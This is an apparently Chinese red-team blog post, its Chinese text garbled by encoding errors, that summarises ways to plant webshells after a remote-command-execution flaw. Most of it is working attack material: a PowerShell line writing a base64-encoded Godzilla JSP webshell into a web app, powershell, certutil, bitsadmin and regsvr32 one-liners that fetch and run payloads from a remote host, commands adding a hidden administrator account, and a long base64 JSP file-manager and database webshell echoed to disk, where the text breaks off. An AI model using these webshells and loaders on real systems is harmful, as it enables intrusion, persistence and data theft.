id="é‡åˆ°é‚£ç§å·¥å…·ç±»ï¼Œæ‰“çš„shiroæˆ–è€…weblogicæˆ–è€…strust2çš„ï¼Œæ˜¯windowsçš„ï¼Œå¯ä»¥ç”¨powershellå†™ï¼š"><a href="#é‡åˆ°é‚£ç§å·¥å…·ç±»ï¼Œæ‰“çš„shiroæˆ–è€…weblogicæˆ–è€…strust2çš„ï¼Œæ˜¯windowsçš„ï¼Œå¯ä»¥ç”¨powershellå†™ï¼š" class="headerlink" title="é‡åˆ°é‚£ç§å·¥å…·ç±»ï¼Œæ‰“çš„shiroæˆ–è€…weblogicæˆ–è€…strust2çš„ï¼Œæ˜¯windowsçš„ï¼Œå¯ä»¥ç”¨powershellå†™ï¼š"></a>é‡åˆ°é‚£ç§å·¥å…·ç±»ï¼Œæ‰“çš„shiroæˆ–è€…weblogicæˆ–è€…strust2çš„ï¼Œæ˜¯windowsçš„ï¼Œå¯ä»¥ç”¨powershellå†™ï¼š</h3><p>powershell [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(â€˜PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRlY2xhcmF0aW9uPiBTdHJpbmcgeGM9IjNjNmUwYjhhOWMxNTIyNGEiOyBTdHJpbmcgcGFzcz0icGFzcyI7IFN0cmluZyBtZDU9bWQ1KHBhc3MreGMpOyBjbGFzcyBYIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7cHVibGljIFgoQ2xhc3NMb2FkZXIgeil7c3VwZXIoeik7fXB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGNiLCAwLCBjYi5sZW5ndGgpO30gfXB1YmxpYyBieXRlW10geChieXRlW10gcyxib29sZWFuIG0peyB0cnl7amF2YXguY3J5cHRvLkNpcGhlciBjPWphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdChtPzE6MixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyh4Yy5nZXRCeXRlcygpLCJBRVMiKSk7cmV0dXJuIGMuZG9GaW5hbChzKTsgfWNhdGNoIChFeGNlcHRpb24gZSl7cmV0dXJuIG51bGw7IH19IHB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykge1N0cmluZyByZXQgPSBudWxsO3RyeSB7amF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0IG07bSA9IGphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdC5nZXRJbnN0YW5jZSgiTUQ1Iik7bS51cGRhdGUocy5nZXRCeXRlcygpLCAwLCBzLmxlbmd0aCgpKTtyZXQgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoMSwgbS5kaWdlc3QoKSkudG9TdHJpbmcoMTYpLnRvVXBwZXJDYXNlKCk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9cmV0dXJuIHJldDsgfSBwdWJsaWMgc3RhdGljIFN0cmluZyBiYXNlNjRFbmNvZGUoYnl0ZVtdIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7U3RyaW5nIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZVRvU3RyaW5nIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NEVuY29kZXIiKTsgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tdIHsgYnl0ZVtdLmNsYXNzIH0pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSBwdWJsaWMgc3RhdGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7Ynl0ZVtdIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZSkge3RyeSB7IGJhc2U2ND1DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7IE9iamVjdCBkZWNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7IHZhbHVlID0gKGJ5dGVbXSlkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7fX1yZXR1cm4gdmFsdWU7IH08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD50cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+â€™)) &gt;./webapps/nc_web/123111.jspx</p><p><img src="RCEå†™shellå§¿åŠ¿æ€»ç»“.assets/image-20211110234036047.png" alt="image-20211110234036047"></p><p>å“¥æ–¯æ‹‰çš„é©¬</p><p><img src="RCEå†™shellå§¿åŠ¿æ€»ç»“.assets/image-20211110234050159.png" alt="image-20211110234050159"></p><p>åœ¨çº¢è“å¯¹æŠ—ä¸­ï¼Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œç±»æ¼æ´å¾€å¾€æ˜¯æ”»å‡»æ–¹åœ¨æ­£é¢è·¯å¾„ä¸­çªç ´è¾¹ç•Œéå¸¸é’ççš„ã€‚å¸¸è§çš„å¯ä»¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤çš„æ¼æ´çš„æœ‰å„ç§ JAVA ååºåˆ—åŒ–æ¼æ´ã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç”Ÿï¼‰ã€è¡¨è¾¾å¼æ‰§è¡Œæ¼æ´ã€SQL æ³¨å…¥æ¼æ´ç­‰ã€‚è¿œç¨‹å‘½ä»¤æ‰§è¡Œç±»æ¼æ´ä»æ¼æ´æ¢æµ‹åˆ°æ¼æ´åˆ©ç”¨å…¶å®éƒ½éå¸¸è®²ç©¶æŠ€å·§ã€‚å¦‚æœåœ¨è¿›è¡Œæ¼æ´æ¢æµ‹é˜¶æ®µè€ƒè™‘çš„æƒ…å†µä¸å…¨å°±ä¼šå¾ˆå®¹æ˜“é—æ¼æ¼æ´ï¼Œä¸æ¼æ´æ“¦è‚©è€Œè¿‡ï¼›åœ¨æ¼æ´åˆ©ç”¨é˜¶æ®µå¦‚æœçŸ¥è¯†é¢ä¸å¹¿ï¼ˆå§¿åŠ¿ä¸å¤Ÿå¤šï¼‰çš„è¯å¯èƒ½å°±ä¼šé™·å…¥è‹¦è‹¦æŒ£æ‰å´æ— æ³•è·å–æƒé™çš„å›°å¢ƒã€‚</p><p>ä»å¤§æ–¹å‘ä¸Šçœ‹ï¼Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œç±»æ¼æ´åœ¨æ¼æ´åˆ©ç”¨é˜¶æ®µå…³æ³¨çš„é—®é¢˜ä¸»è¦æ˜¯ä¸‰ä¸ªï¼šç›®æ ‡æ“ä½œç³»ç»Ÿç±»å‹ã€æ‰§è¡Œå‘½ä»¤ç»“æœæ˜¯å¦æœ‰å›æ˜¾ä»¥åŠæ˜¯å¦èƒ½é€šå¤–ç½‘ã€‚é’ˆå¯¹ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œæ‰§è¡Œå‘½ä»¤å„æœ‰å·®å¼‚ã€‚å¦å¤–ï¼Œç›®æ ‡æ˜¯å¦æœ‰å›æ˜¾æ˜¯æ¼æ´åˆ©ç”¨çš„éš¾æ˜“ç¨‹åº¦çš„å…³é”®å› ç´ ä¹‹ä¸€ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥å›æ˜¾çš„æ¼æ´è¦æ¯”æ— å›æ˜¾çš„æ¼æ´åˆ©ç”¨è¦å®¹æ˜“å¾—å¤š (å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•è®©åŸæœ¬æ— å›æ˜¾çš„æ¼æ´å¾—åˆ°å›æ˜¾ï¼Œè¿™é‡Œå…ˆä¸è®¨è®ºè¿™ç§æƒ…å†µ)ã€‚æœ€åç›®æ ‡æ˜¯å¦èƒ½é€šå¤–ç½‘ä¹Ÿæ˜¯ç›´æ¥å½±å“æ¼æ´åˆ©ç”¨çš„å…³é”®å› ç´ ï¼Œå¦‚æœæ¼æ´æ— å›æ˜¾å¹¶ä¸”ä¹Ÿä¸é€šå¤–ç½‘ï¼Œé‚£æ¼æ´åˆ©ç”¨å¯çš„éš¾åº¦å°±å¤§å¤§å¢åŠ äº†ã€‚ä»æ›´åŠ ç»†èŠ‚çš„è§’åº¦å»è€ƒè™‘ï¼Œé’ˆå¯¹ä¸åŒçš„æ¼æ´ï¼Œä¸åŒçš„ç¯å¢ƒï¼Œéœ€è¦è€ƒè™‘çš„é¢å¤–å› ç´ å°±æ›´å¤šäº†ã€‚æ¯”å¦‚æ“ä½œç³»ç»Ÿæ˜¯å¦å­˜åœ¨æˆ–è€…å¯ä»¥æ‰§è¡ŒæŸä¸ªå‘½ä»¤ã€ç›®æ ‡æ˜¯å¦å®‰è£…æ€è½¯ã€å‘½ä»¤ä¸­çš„ç‰¹æ®Šç¬¦å·ç­‰é—®é¢˜ã€‚ä»¥ä¸‹å°±è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨æŠ€å·§åšä¸€ä¸ªç®€å•çš„æ€»ç»“ã€‚</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="åœºæ™¯ä¸€"><a href="#åœºæ™¯ä¸€" class="headerlink" title="åœºæ™¯ä¸€"></a>åœºæ™¯ä¸€</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šæ˜¯<br>æ˜¯å¦é€šå¤–ç½‘ï¼šæ˜¯</p><p>è§£å†³æ€è·¯ï¼š<br>æœ‰å›æ˜¾ä¹Ÿå¯ä»¥é€šå¤–ç½‘çš„åœºæ™¯æ˜¯æœ€ç®€å•ï¼Œè·å–æƒé™çš„æ–¹æ³•ä¹Ÿæ˜¯å¤šæ ·çš„ï¼Œä»¥ä¸‹ä¸»è¦ç®€å•æ€»ç»“ä¸€äº›å¸¸è§çš„æ–¹æ³•æˆ–æ€è·¯</p><p>æ–¹æ³•ä¸€ï¼šç¡®è®¤ Web åº”ç”¨ç‰©ç†è·¯å¾„ï¼Œç„¶åå†™å…¥ webshell (å‚è€ƒåœºæ™¯äºŒ)</p><p>æ–¹æ³•äºŒï¼šè¿œç¨‹ä¸‹è½½å¹¶æ‰§è¡Œ<br>aï¼‰powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://x.x.x.x/p&apos;))&quot;</span><br></pre></td></tr></table></figure><p>b)certutil</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://x.x.x.x/test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br></pre></td></tr></table></figure><p>c)bitsadmin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://x.x.x.x/test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br></pre></td></tr></table></figure><p>d)regsvr32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://x.x.x.x/r scrobj.dll</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰ï¼šå¦‚æœç›®æ ‡å¼€æ”¾è¿œç¨‹æ¡Œé¢ç«¯å£çš„è¯ï¼Œå¹¶ä¸”æƒé™è¶³å¤Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤æ·»åŠ è´¦å· (å†…ç½‘æ¯”è¾ƒå¸¸è§)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user test test@123qaz /add</span><br><span class="line">net localgroup administrators test /add</span><br><span class="line">æˆ–è€…å¯ç”¨guestè´¦å·ï¼š</span><br><span class="line">net user guest /active:yes</span><br><span class="line">net user guest guest@123qaz</span><br><span class="line">net localgroup administrators guest /add</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯äºŒ"><a href="#åœºæ™¯äºŒ" class="headerlink" title="åœºæ™¯äºŒ"></a>åœºæ™¯äºŒ</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šæ˜¯<br>æ˜¯å¦é€šå¤–ç½‘ï¼šå¦</p><p>è§£å†³æ€è·¯ï¼šé’ˆå¯¹è¿™ç§åœºæ™¯ï¼Œè§£å†³æ–¹æ³•å°±æ¯”è¾ƒçµæ´»äº†ã€‚å› ä¸ºä¸é€šå¤–ç½‘ï¼Œæ‰€ä»¥ä¸»æ€è·¯è¿˜æ˜¯æƒ³åŠæ³•å†™å…¥ webshellã€‚</p><ol><li>ç¡®è®¤ Web åº”ç”¨ç‰©ç†è·¯å¾„</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s/a-d/b /WEB-INF/web.xml</span><br><span class="line">æˆ–è€…</span><br><span class="line">for /r c:\ %i in (checkCode.js*) do @echo %i</span><br></pre></td></tr></table></figure><ol><li>å†™å…¥ webshellï¼Œéœ€è¦è€ƒè™‘ webshell ç‰¹æ®Šç¬¦å·é—®é¢˜ï¼Œå¯ä»¥å…ˆåš base64 ç¼–ç å†™å…¥</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -----BEGIN CERTIFICATE----- &gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt&amp;&amp;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKixqYXZhLnV0aWwuKixqYXZhLm5ldC4qLGphdmEuc3FsLiosamF2YS50ZXh0LioiJT48JSFTdHJpbmcgUHdkPSIxMTAiO1N0cmluZyBjcz0iVVRGLTgiO1N0cmluZyBFQyhTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue3JldHVybiBuZXcgU3RyaW5nKHMuZ2V0Qnl0ZXMoIklTTy04ODU5LTEiKSxjcyk7fUNvbm5lY3Rpb24gR0MoU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7Q2xhc3MuZm9yTmFtZSh4WzBdLnRyaW0oKSk7aWYoeFsxXS5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMSl7cmV0dXJuIERyaXZlck1hbmFnZXIuZ2V0Q29ubmVjdGlvbih4WzFdLnRyaW0oKSsiOiIreFs0XSx4WzJdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzJdLHhbM10uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbM10pO31lbHNle0Nvbm5lY3Rpb24gYz1Ecml2ZXJNYW5hZ2VyLmdldENvbm5lY3Rpb24oeFsxXS50cmltKCkseFsyXS5lcXVhbHNJZ25vcmVDYXNlKCJbL251bGxdIik/IiI6eFsyXSx4WzNdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzNdKTtpZih4Lmxlbmd0aD40KXtjLnNldENhdGFsb2coeFs0XSk7fXJldHVybiBjO319dm9pZCBBQShTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIHJbXT1GaWxlLmxpc3RSb290cygpO2ZvcihpbnQgaT0wO2k8ci5sZW5ndGg7aSsrKXtzYi5hcHBlbmQocltpXS50b1N0cmluZygpLnN1YnN0cmluZygwLDIpKTt9fXZvaWQgQkIoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257RmlsZSBvRj1uZXcgRmlsZShzKSxsW109b0YubGlzdEZpbGVzKCk7U3RyaW5nIHNULHNRLHNGPSIiO2phdmEudXRpbC5EYXRlIGR0O1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtmb3IoaW50IGk9MDsgaTxsLmxlbmd0aDsgaSsrKXtkdD1uZXcgamF2YS51dGlsLkRhdGUobFtpXS5sYXN0TW9kaWZpZWQoKSk7c1Q9Zm0uZm9ybWF0KGR0KTtzUT1sW2ldLmNhblJlYWQoKT8iUiI6IiI7c1EgKz1sW2ldLmNhbldyaXRlKCk/IiBXIjoiIjtpZihsW2ldLmlzRGlyZWN0b3J5KCkpe3NiLmFwcGVuZChsW2ldLmdldE5hbWUoKSsiL1x0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iKTt9ZWxzZXtzRis9bFtpXS5nZXROYW1lKCkrIlx0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iO319c2IuYXBwZW5kKHNGKTt9dm9pZCBFRShTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgZj1uZXcgRmlsZShzKTtpZihmLmlzRGlyZWN0b3J5KCkpe0ZpbGUgeFtdPWYubGlzdEZpbGVzKCk7Zm9yKGludCBrPTA7IGsgPCB4Lmxlbmd0aDsgaysrKXtpZigheFtrXS5kZWxldGUoKSl7RUUoeFtrXS5nZXRQYXRoKCkpO319fWYuZGVsZXRlKCk7fXZvaWQgRkYoU3RyaW5nIHMsSHR0cFNlcnZsZXRSZXNwb25zZSByKXRocm93cyBFeGNlcHRpb257aW50IG47Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTtyLnJlc2V0KCk7U2VydmxldE91dHB1dFN0cmVhbSBvcz1yLmdldE91dHB1dFN0cmVhbSgpO0J1ZmZlcmVkSW5wdXRTdHJlYW0gaXM9bmV3IEJ1ZmZlcmVkSW5wdXRTdHJlYW0obmV3IEZpbGVJbnB1dFN0cmVhbShzKSk7b3Mud3JpdGUoKCItPiIrInwiKS5nZXRCeXRlcygpLDAsMyk7d2hpbGUoKG49aXMucmVhZChiLDAsNTEyKSkhPS0xKXtvcy53cml0ZShiLDAsbik7fW9zLndyaXRlKCgifCIrIjwtIikuZ2V0Qnl0ZXMoKSwwLDMpO29zLmNsb3NlKCk7aXMuY2xvc2UoKTt9dm9pZCBHRyhTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBoPSIwMTIzNDU2Nzg5QUJDREVGIjtGaWxlIGY9bmV3IEZpbGUocyk7Zi5jcmVhdGVOZXdGaWxlKCk7RmlsZU91dHB1dFN0cmVhbSBvcz1uZXcgRmlsZU91dHB1dFN0cmVhbShmKTtmb3IoaW50IGk9MDsgaTxkLmxlbmd0aCgpO2krPTIpe29zLndyaXRlKChoLmluZGV4T2YoZC5jaGFyQXQoaSkpIDw8IDQgfCBoLmluZGV4T2YoZC5jaGFyQXQoaSsxKSkpKTt9b3MuY2xvc2UoKTt9dm9pZCBISChTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgc2Y9bmV3IEZpbGUocyksZGY9bmV3IEZpbGUoZCk7aWYoc2YuaXNEaXJlY3RvcnkoKSl7aWYoIWRmLmV4aXN0cygpKXtkZi5ta2RpcigpO31GaWxlIHpbXT1zZi5saXN0RmlsZXMoKTtmb3IoaW50IGo9MDsgajx6Lmxlbmd0aDsgaisrKXtISChzKyIvIit6W2pdLmdldE5hbWUoKSxkKyIvIit6W2pdLmdldE5hbWUoKSk7fX1lbHNle0ZpbGVJbnB1dFN0cmVhbSBpcz1uZXcgRmlsZUlucHV0U3RyZWFtKHNmKTtGaWxlT3V0cHV0U3RyZWFtIG9zPW5ldyBGaWxlT3V0cHV0U3RyZWFtKGRmKTtpbnQgbjtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3doaWxlKChuPWlzLnJlYWQoYiwwLDUxMikpIT0tMSl7b3Mud3JpdGUoYiwwLG4pO31pcy5jbG9zZSgpO29zLmNsb3NlKCk7fX12b2lkIElJKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257RmlsZSBzZj1uZXcgRmlsZShzKSxkZj1uZXcgRmlsZShkKTtzZi5yZW5hbWVUbyhkZik7fXZvaWQgSkooU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIGY9bmV3IEZpbGUocyk7Zi5ta2RpcigpO312b2lkIEtLKFN0cmluZyBzLFN0cmluZyB0KXRocm93cyBFeGNlcHRpb257RmlsZSBmPW5ldyBGaWxlKHMpO1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtqYXZhLnV0aWwuRGF0ZSBkdD1mbS5wYXJzZSh0KTtmLnNldExhc3RNb2RpZmllZChkdC5nZXRUaW1lKCkpO312b2lkIExMKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257VVJMIHU9bmV3IFVSTChzKTtpbnQgbj0wO0ZpbGVPdXRwdXRTdHJlYW0gb3M9bmV3IEZpbGVPdXRwdXRTdHJlYW0oZCk7SHR0cFVSTENvbm5lY3Rpb24gaD0oSHR0cFVSTENvbm5lY3Rpb24pIHUub3BlbkNvbm5lY3Rpb24oKTtJbnB1dFN0cmVhbSBpcz1oLmdldElucHV0U3RyZWFtKCk7Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTt3aGlsZSgobj1pcy5yZWFkKGIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3MuY2xvc2UoKTtpcy5jbG9zZSgpO2guZGlzY29ubmVjdCgpO312b2lkIE1NKElucHV0U3RyZWFtIGlzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBsO0J1ZmZlcmVkUmVhZGVyIGJyPW5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIoaXMpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9fXZvaWQgTk4oU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1Jlc3VsdFNldCByPXMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/Yy5nZXRNZXRhRGF0YSgpLmdldFNjaGVtYXMoKTpjLmdldE1ldGFEYXRhKCkuZ2V0Q2F0YWxvZ3MoKTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKDEpKyJcdCIpO31yLmNsb3NlKCk7Yy5jbG9zZSgpO312b2lkIE9PKFN0cmluZyBzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue0Nvbm5lY3Rpb24gYz1HQyhzKTtTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7UmVzdWx0U2V0IHI9Yy5nZXRNZXRhRGF0YSgpLmdldFRhYmxlcyhudWxsLHMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/eC5sZW5ndGg+NT94WzVdOnhbNF06bnVsbCwiJSIsbmV3IFN0cmluZ1tdeyJUQUJMRSJ9KTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKCJUQUJMRV9OQU1FIikrIlx0Iik7fXIuY2xvc2UoKTtjLmNsb3NlKCk7fXZvaWQgUFAoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257U3RyaW5nW10geD1zLnRyaW0oKS5zcGxpdCgiXHJcbiIpO0Nvbm5lY3Rpb24gYz1HQyhzKTtTdGF0ZW1lbnQgbT1jLmNyZWF0ZVN0YXRlbWVudCgxMDA1LDEwMDcpO1Jlc3VsdFNldCByPW0uZXhlY3V0ZVF1ZXJ5KCJzZWxlY3QgKiBmcm9tICIreFt4Lmxlbmd0aC0xXSk7UmVzdWx0U2V0TWV0YURhdGEgZD1yLmdldE1ldGFEYXRhKCk7Zm9yKGludCBpPTE7aTw9ZC5nZXRDb2x1bW5Db3VudCgpO2krKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiICgiK2QuZ2V0Q29sdW1uVHlwZU5hbWUoaSkrIilcdCIpO31yLmNsb3NlKCk7bS5jbG9zZSgpO2MuY2xvc2UoKTt9dm9pZCBRUShTdHJpbmcgY3MsU3RyaW5nIHMsU3RyaW5nIHEsU3RyaW5nQnVmZmVyIHNiLFN0cmluZyBwKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1N0YXRlbWVudCBtPWMuY3JlYXRlU3RhdGVtZW50KDEwMDUsMTAwOCk7QnVmZmVyZWRXcml0ZXIgYnc9bnVsbDt0cnl7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkocS5pbmRleE9mKCItLWY6IikhPS0xP3Euc3Vic3RyaW5nKDAscS5pbmRleE9mKCItLWY6IikpOnEpO1Jlc3VsdFNldE1ldGFEYXRhIGQ9ci5nZXRNZXRhRGF0YSgpO2ludCBuPWQuZ2V0Q29sdW1uQ291bnQoKTtmb3IoaW50IGk9MTsgaSA8PW47IGkrKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiXHR8XHQiKTt9c2IuYXBwZW5kKCJcclxuIik7aWYocS5pbmRleE9mKCItLWY6IikhPS0xKXtGaWxlIGZpbGU9bmV3IEZpbGUocCk7aWYocS5pbmRleE9mKC